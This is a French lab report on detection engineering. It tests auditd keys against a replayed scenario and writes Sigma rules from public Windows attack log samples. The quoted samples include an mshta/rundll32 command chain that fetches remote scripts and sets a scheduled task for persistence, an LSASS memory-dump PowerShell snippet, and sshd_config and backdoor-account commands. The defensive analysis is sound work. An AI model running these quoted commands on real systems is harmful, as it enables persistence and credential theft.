# Compte rendu semaine 2, partie Linux (auditd + Neo23x0) et Windows (Sysmon/Security)

## Vérification des clés auditd sur le scénario rejoué

Scénario : `auditd-scenario.sh` copié dans `lab-auditd` puis exécuté avec
`auid=1001` (labuser) forcé via `/proc/self/loginuid`. Six actions :
exécution d'un binaire caché, `sudo whoami`, `sudo useradd`, modification
de `sshd_config`, `chmod 777`, lecture refusée de `/etc/shadow`.

**`ausearch -k process_creation -ts recent`** donne tous les `execve` de
l'hôte, pas seulement ceux du scénario. Pas de filtre `auid`, donc capture
aussi des processus étrangers au conteneur (`docker`, `runc`). En
filtrant sur `auid=1001`, les actions du scénario ressortent du bruit.
Clé fonctionnelle, bruyante par construction.

**`ausearch -k etcpasswd -ts recent`** donne les écritures sur la base
compte/groupe (`/etc/passwd`, `/etc/subuid`, `/etc/subgid`). Le `sudo
useradd -m backdoor_user` du scénario est capturé :
`comm="useradd" auid=1001 uid=0 key="etcpasswd"`. `auid` (labuser) contre
`uid=0` (root via sudo) confirme la distinction auid/uid en pratique.

**`ausearch -k sshd -ts recent`** donne les écritures sur `/etc/ssh/` :
`comm="bash" auid=1001 key="sshd"`, correspondant au `sudo bash -c "echo
PermitRootLogin yes >> /etc/ssh/sshd_config"` du scénario. La clé
surveille le fichier modifié, pas un programme précis : n'importe quel
processus qui touche `/etc/ssh/` la déclenche.

**`ausearch -k perm_mod -ts recent`** donne les appels
`chmod`/`chown`/`fchmod`. Deux lignes liées à `useradd` en interne, et une
ligne explicite `comm="chmod" auid=1001 uid=1001`, correspondant au
`chmod 777 /tmp/.hidden_payload` (exécuté sans sudo).

**`ausearch -k unauthedfileaccess -ts recent`** donne les tentatives
d'accès **refusées** à `/etc`, `/bin`, `/sbin` (filtre sur `success=0`) :
`comm="cat" success=no exit=-13`, `EACCES`, correspondant au `cat
/etc/shadow` refusé. Cette clé ne capture que le tâtonnement : un accès
réussi (en root) ne serait pas détecté.

## Le volume de `process_creation`, chiffré

**`ausearch -k process_creation -ts today | grep -c type=SYSCALL`** donne
**939** événements depuis le début de la journée, contre 6 actions
pertinentes du scénario. L'écart s'explique par l'absence de filtre
`auid` sur cette clé précise du ruleset Neo23x0 : contrairement à
`etcpasswd`, `sshd`, `perm_mod` et `unauthedfileaccess`, qui ciblent des
fichiers/appels précis, elle capture tout `execve` de la machine.

## Lecture de logs Sysmon/Security

Analyse fichier par fichier d'échantillons `.evtx` issus du dépôt public
[sbousseaden/EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES)
(rendus en `.xml` pour la lecture). Ces échantillons ne font pas partie
de ce dépôt, les noms de fichiers cités ci-dessous renvoient au dépôt
source.

### meterpreter_migrate_to_explorer_sysmon_8.xml

Provider `Microsoft-Windows-Sysmon`, EventID `8`, catégorie
`create_remote_thread`.

```xml
<Data Name="SourceImage">\\vboxsrv\HTools\m.exe</Data>
<Data Name="TargetImage">C:\Windows\explorer.exe</Data>
```

Un exécutable au nom opaque, lancé depuis un chemin UNC distant, crée un
thread dans explorer.exe. `TargetImage` n'apporte pas de valeur de
détection (nombreux process cibles possibles, sans liste fermée utile,
confirmé sur de vraies règles SigmaHQ du même type). `SourceImage` porte
le signal : exécutable lancé depuis un chemin distant.

```yaml
SourceImage|contains: '\\'
```

Limite connue : matche les chemins UNC mais laisserait passer un
équivalent depuis un lecteur mappé (`Z:\...`).

### CA_DCSync_4662.xml

Provider `Microsoft-Windows-Security-Auditing` (journal Security natif,
comme `009`/`010`/`011`). EventID `4662`, Directory
Service Access. Trois événements quasi identiques, un seul champ varie :

```xml
<Data Name="Properties">%%7688
        {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
    {19195a5b-6da0-11d0-afd3-00c04fd930c9}
</Data>
```

Deux premiers événements : GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`,
troisième : `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`. Identifiants fixes de
droits étendus AD, vérifiés sur la documentation Microsoft :
- `1131f6aa-...` = DS-Replication-Get-Changes
- `1131f6ad-...` = DS-Replication-Get-Changes-All

Obtenir les deux droits sur le même compte est la signature DCSync.

**Détection.** Alerter sur un seul GUID serait trop large (2-3 comptes de
DC font cette réplication en continu). Filtre pertinent : `SubjectUserName`.
Les deux GUID n'apparaissent jamais dans le même événement : une
condition `selection_a and selection_b` sur une seule règle ne matche
donc jamais. Deux règles atomiques, une par GUID, plus une corrélation
qui vérifie qu'elles se déclenchent pour le même acteur dans une fenêtre
courte, sur le modèle `002a`/`002b`, avec `type: temporal`
(plusieurs règles distinctes pour le même acteur) plutôt que `event_count`.

Règle atomique 1 :
```yaml
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains: '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
    condition: selection
```
Règle atomique 2, identique avec `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`.

Corrélation, référençant les deux par leur `id` :
```yaml
correlation:
    type: temporal
    rules:
        - <id règle 1>
        - <id règle 2>
    group-by:
        - SubjectUserName
    timespan: 5m
```
`timespan: 5m` large par rapport au fichier (droits accordés à quelques
millisecondes d'écart), à resserrer selon le volume réel de faux positifs.

Vérifié (`sigma convert -t eql`) :
```
sample by SubjectUserName
 [any where EventID:4662 and Properties:"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*"]
 [any where EventID:4662 and Properties:"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"]
```

**Limite connue.** Exclure les DC légitimes par `SubjectUserName` protège
du bruit mais crée un angle mort si un attaquant compromet un de ces
comptes. Deux axes d'amélioration non implémentés :
- règle complémentaire sur l'**attribution** du droit (modification d'ACL
  accordant Get-Changes/-All à un nouveau principal), en amont de l'usage
- baseliner le comportement normal des DC légitimes plutôt que les
  exclure en bloc

### CA_hashdump_4663_4656_lsass_access.xml

Journal Security natif, deux événements, `4656` puis `4663`.

`4656` (handle demandé) :
```xml
<Data Name="ObjectName">\Device\HarddiskVolume1\Windows\System32\lsass.exe</Data>
<Data Name="AccessMask">0x001f3fff</Data>
<Data Name="ProcessName">C:\Windows\System32\cscript.exe</Data>
```
`cscript.exe` (LOLBIN classique) demande un handle sur `lsass.exe` avec un
masque large. Une demande de handle n'est pas encore un accès effectif.

`4663` (accès effectif), l'événement porteur du signal :
```xml
<Data Name="AccessMask">0x00000010</Data>
```
`0x10` = `PROCESS_VM_READ`, lecture mémoire (pas exécution). Signature
classique de dump de credentials (T1003.001, même technique que
`015_lsass_read_access.yml`, vue ici via le journal natif).

`HandleId` (identifiant éphémère, différent à chaque occurrence) sert à
corréler `4663` avec son `4656`, pas de critère de détection. `AccessList`
redondant avec `AccessMask`.

Règle, construite sur `4663` :
```yaml
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4663
        ObjectName|endswith: '\lsass.exe'
        AccessMask: '0x00000010'
    filter:
        ProcessName|contains: 'C:\Program Files'
    condition: selection and not filter
```
Vérifié (`sigma convert -t lucene -p windows-logsources`) :
```
Channel:Security AND ((EventID:4663 AND ObjectName:*\\lsass.exe AND AccessMask:0x00000010) AND (NOT ProcessName:*C\:\\Program\ Files*))
```

Filtre `C:\Program Files` : convention d'installation des logiciels
professionnels (droits admin requis), bon proxy pour "agent EDR/AV
légitime". Un filtre sur `C:\` seul aurait été trop large (la
quasi-totalité des process, légitimes et malveillants, tournent depuis
`C:\`, y compris un payload dans `Downloads`/`Temp`/`AppData`).

Point de vigilance : l'argument "une autre règle aura déjà alerté sur
l'accès initial" est fragile ici. Le dump LSASS est typiquement une étape
tardive d'intrusion (souvent juste avant un DCSync), pas le point
d'entrée. Une couverture en amont ne dispense pas de détecter cette étape
directement.

### exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.xml

Huit événements, trois EventID (1, 3, 11), une seule chaîne d'attaque
(exécution et réseau entrelacés, pas deux blocs séparés).

**Chaîne d'exécution (EventID 1, x4) :**
```
cmd.exe /C rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...mshta https://hotelesms.com/talsk.txt...
→ rundll32.exe (même commande, relancée par cmd.exe)
→ mshta.exe "https://hotelesms.com/talsk.txt"
→ schtasks.exe /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR "mshta.exe https://hotelesms.com/Injection.txt" /F
```
`rundll32.exe` détourné pour exécuter du JavaScript inline via
`mshtml,RunHTMLApplication` (LOLBAS connu), qui lance `mshta.exe` pour
récupérer du contenu distant. `mshta.exe` crée ensuite une tâche
planifiée qui le relancera toutes les 60 minutes sur une autre URL.

**Parenté des process.** Chaque event porte un `ProcessGuid` et un
`ParentProcessGuid` (mécanisme Sysmon standard, indépendant de toute
config), le `ProcessGuid` d'un event redevenant le `ParentProcessGuid` du
suivant :
```
cmd.exe → rundll32.exe → mshta.exe → schtasks.exe
```
`svchost.exe` (event 11) a un `ProcessGuid` distinct : c'est le service
Planificateur de tâches réagissant à l'appel `schtasks.exe`, pas un
descendant du process. La propreté du fichier (huit événements quasi
tous liés, `EventRecordID` consécutifs) tient probablement à une capture
sur VM de test peu active ; en production, la chaîne serait noyée dans du
bruit, à reconstituer via les `ProcessGuid`.

**Connexions réseau (EventID 3, x3).** Toutes émises par `mshta.exe`,
trois destinations (port 443 puis deux fois le port 80) : communication
continue après le lancement.

**Création de fichier (EventID 11).** `Image=svchost.exe`,
`TargetFilename=C:\Windows\System32\Tasks\MSOFFICE_`. Pas un fichier
Office : `Tasks\` est le dossier des tâches planifiées, `MSOFFICE_` est
le nom donné par `schtasks` (`/TN MSOFFICE_`), choisi pour évoquer un
processus Office légitime.

**Tactique.** La tâche planifiée survit à un redémarrage, contrairement à
la chaîne d'exécution initiale.
```
T1053.005 (Scheduled Task) -> ['execution', 'persistence', 'privilege-escalation']
```

**Détection.** Trois règles étroites, une par étape à forte valeur de
signal, plutôt qu'une seule règle sur toute la chaîne (même logique que
la recherche menée sur les règles `create_remote_thread` publiées par
SigmaHQ).

```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains: 'javascript:'
    condition: selection
```
```yaml
detection:
    selection:
        Image|endswith: '\mshta.exe'
        ParentImage|endswith: '\rundll32.exe'
    condition: selection
```
```yaml
detection:
    selection_process:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: 'mshta.exe'
    selection_url:
        CommandLine|contains: 'http'
    condition: selection_process and selection_url
```
Vérifié : `Image:*\\schtasks.exe AND CommandLine:*mshta.exe* AND CommandLine:*http*`.

Point de vigilance YAML sur la dernière règle : une clé répétée
(`CommandLine|contains:` deux fois) est silencieusement écrasée par le
parseur, seule la dernière valeur survit. Une liste sous une seule clé
encode un OU, pas un ET. D'où les deux blocs distincts combinés par `and`
(pattern de `013_powershell_script_from_suspicious_path.yml`).

### LM_5145_Remote_FileCopy.xml

Fichier volumineux (869 événements), journal Security natif. `EventID
5145` : vérification d'accès à un partage réseau, pas nécessairement
l'accès lui-même. Bruyant par nature.

**Faits vérifiés :**
```
IpAddress          : 10.0.2.15 (une seule)
SubjectUserName     : Administrator (un seul)
ShareName            : \\*\C$ (partage administratif, tout le disque C:)
RelativeTargetName  : 834 valeurs distinctes
```

**Nature de l'activité.** Les codes `AccessList` dominants (704x `%%1541`,
159x `%%1538`) correspondent à `SYNCHRONIZE`/`READ_CONTROL` (vérifié sur
la doc Microsoft), droits génériques demandés à quasiment chaque
ouverture de handle, pas `ReadData` (quasi absent). Pattern
d'énumération/reconnaissance plutôt que de copie de contenu déjà en
cours, sans exclure qu'un même outil enchaîne les deux phases.

Sources : [Event 5145, Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5145),
[Windows Security Log Event ID 5145](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5145)

**Détection.** Alerter sur `AccessList` serait trop bruyant (demandé en
continu sur tout partage légitime). Signal pertinent : `ShareName` (`C$`,
rare et sensible) combiné au volume. Même logique de corrélation que le
bruteforce SSH (`002b`).

```yaml
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        ShareName|endswith: '\C$'
    condition: selection
falsepositives:
    - Administration IT légitime via C$ (backup, déploiement, dépannage à distance)
level: low
```
```yaml
correlation:
    type: event_count
    rules:
        - <id règle atomique>
    group-by:
        - SubjectUserName
        - IpAddress
    timespan: 5m
    condition:
        gte: 50
level: high
```
Vérifié (`esql`) :
```
from * metadata _id, _index, _version | where EventID==5145 and ends_with(ShareName, "\\C$")
| eval timebucket=date_trunc(5minutes, @timestamp) | stats event_count=count() by timebucket, SubjectUserName, IpAddress
| where event_count >= 50
```
Seuil de 50 choisi par rapport au volume observé (834 accès), à ajuster
avec de vraies données de trafic normal en prod.

### LM_Remote_Service02_7045.xml

Trois événements, `Provider="Service Control Manager"`, `EventID 7045`
(service installé). Canal `System`, seul fichier de l'exercice sur ce
canal plutôt que `Security`.

```
ServiceName=spoolfool   ImagePath=cmd.exe   StartType=auto start   AccountName=LocalSystem
ServiceName=spoolsv     ImagePath=cmd.exe   StartType=auto start   AccountName=LocalSystem
ServiceName=remotesvc   ImagePath=calc.exe  StartType=auto start   AccountName=LocalSystem
```

`cmd.exe`/`calc.exe` sont déjà présents sur tout Windows : pas un dépôt de
nouveaux exécutables, mais l'enregistrement d'un service référençant un
binaire existant. Utilitaires légitimes détournés comme vecteur
d'exécution, technique de mouvement latéral façon PsExec (cohérent avec
le nom `LM_Remote_Service`). `ServiceName=spoolfool` évoque l'exploit
SpoolFool (CVE-2022-21999), à prendre comme indice sans plus de contexte.

**Signal discriminant.** `StartType`/`AccountName=LocalSystem` ne
discriminent pas seuls (courants sur des services légitimes). Anomalie
réelle : `ImagePath` est un nom de fichier nu, sans chemin. Un vrai
service référence toujours un chemin absolu complet, le Gestionnaire de
contrôle des services ne fait pas de recherche dans le PATH.

**Logsource**, vérifié sur `win_system_service_install_susp.yml`
(SigmaHQ) :
```yaml
logsource:
    product: windows
    service: system
detection:
    selection:
        Provider_Name: 'Service Control Manager'
```
`service: system`, pas `security`. Le canal `System` porte plusieurs
sources, d'où l'intérêt de vérifier `Provider_Name` en plus de l'`EventID`.
Cette règle officielle détecte des motifs précis dans `ImagePath` (`-nop`,
`-w hidden`, `\Temp\`, `\ADMIN$\`...), pas l'absence de chemin : angles
complémentaires, un `cmd.exe` nu ne matcherait aucun de ses motifs.

```yaml
logsource:
    product: windows
    service: system
detection:
    selection:
        Provider_Name: 'Service Control Manager'
        EventID: 7045
    filter:
        ImagePath|contains: '\'
    condition: selection and not filter
falsepositives:
    - Unknown
level: medium
```
Vérifié : `(Provider_Name:"Service Control Manager" AND EventID:7045) AND (NOT ImagePath:*\\*)`.

Tags : T1543.003, vérifié `persistence` + `privilege-escalation`,
cohérent avec la règle SigmaHQ citée.

### Powershell_4104_MiniDumpWriteDump_Lsass.xml

Provider `Microsoft-Windows-PowerShell`, quatre événements : `40961`,
`53504`, `40962` (cycle de vie du moteur PowerShell, sans valeur de
détection) et `4104` (Script Block Logging), porteur du signal.

```xml
<Data Name="ScriptBlockText">function Memory($path)
{
    $Process = Get-Process lsass
    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
    $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle, $ProcessId, ...))
}</Data>
<Data Name="Path">C:\Users\Public\lsass_wer_ps.ps1</Data>
```

Le script récupère `lsass`, puis obtient l'API `MiniDumpWriteDump` par
réflexion sur l'assembly interne de PowerShell, sans DLL externe ni
P/Invoke classique. Dump mémoire complet (T1003.001).

`EventID` 40961/40962/53504 : présents sur toute session PowerShell, sans
valeur de détection. `Path` : emplacement world-writable et nom qui
trahit la technique, mais trivialement renommable, indice contextuel
seulement.

Référence existante, `posh_ps_malicious_keywords.yml` (SigmaHQ) : liste
de mots-clés PowerShell malveillants sur `category: ps_script`,
`ScriptBlockText|contains`, incluant `MiniDumpWriteDump`. Confirme le
champ et la catégorie.

Règle spécifique au cas LSASS, combinant deux signaux :
```yaml
logsource:
    category: ps_script
    product: windows
detection:
    selection_target:
        ScriptBlockText|contains: 'lsass'
    selection_api:
        ScriptBlockText|contains: 'MiniDumpWriteDump'
    condition: selection_target and selection_api
falsepositives:
    - Outil DFIR légitime effectuant une capture mémoire de lsass dans le cadre d'une investigation autorisée
level: high
```
Vérifié : `ScriptBlockText:*lsass* AND ScriptBlockText:*MiniDumpWriteDump*`.

`level: high` malgré le FP identifié : dumper LSASS reste suspect quel
que soit l'outil utilisé.

### sysmon_local_account_creation_and_added_admingroup_12_13.xml

Dix-sept événements Sysmon, `EventID 12` (CreateKey/DeleteKey) et `13`
(SetValue), tous `Image=lsass.exe` : LSASS gère nativement la base SAM, sa
présence n'est pas un signal à elle seule.

Le champ `RuleName` est déjà rempli par la config `sysmon-modular`
(référencée dans le plan) : `"Valid Account - Local Account Created or
Deleted"`, `"Valid Account - Account Added or Deleted from Local
Administrators Group"`, pré-tagging à la source avant tout SIEM.

**Sémantique des chemins registre**, vérifiée :
- `HKLM\SAM\SAM\Domains\Account\Users\Names\<nom>` = création/suppression
  de compte local
- `HKLM\SAM\SAM\Domains\Builtin\Aliases\00000220\C` = appartenance au
  groupe Administrateurs local (`00000220` hexa = `544`, RID de
  `S-1-5-32-544`, BUILTIN\Administrators)

**Comportement.** Le compte `support` est créé (09:28:22), supprimé 20s
après, recréé 34min plus tard, puis supprimé/recréé deux fois de plus. Un
second compte `sqlsvc` est créé une fois. Le groupe Administrateurs local
est modifié quatre fois. Le cycle création/suppression/recréation répété
est un signal comportemental distinct de la simple création, cohérent
avec un script rejoué plusieurs fois.

**Détection**, deux approches :

Sur `RuleName`, si `sysmon-modular` est déployée :
```yaml
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        RuleName|contains: 'Valid Account'
    condition: selection
```
Vérifié : `(EventID:(12 OR 13 OR 14)) AND RuleName:*Valid Account*`.

Sur `TargetObject`, indépendante de la config Sysmon :
```yaml
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\SAM\Domains\Account\Users\Names\'
            - '\SAM\Domains\Builtin\Aliases\00000220\'
    condition: selection
```
Vérifié : `(EventID:(12 OR 13 OR 14)) AND (TargetObject:(*\\SAM\\Domains\\Account\\Users\\Names\\* OR *\\SAM\\Domains\\Builtin\\Aliases\\00000220\\*))`.

Le cycle création/suppression/recréation relève d'une règle de
corrélation (`event_count` sur `CreateKey`/`DeleteKey`, groupée par
`TargetObject`, modèle `002b`/`LM_5145`), non construite ici, identifiée
comme amélioration naturelle.
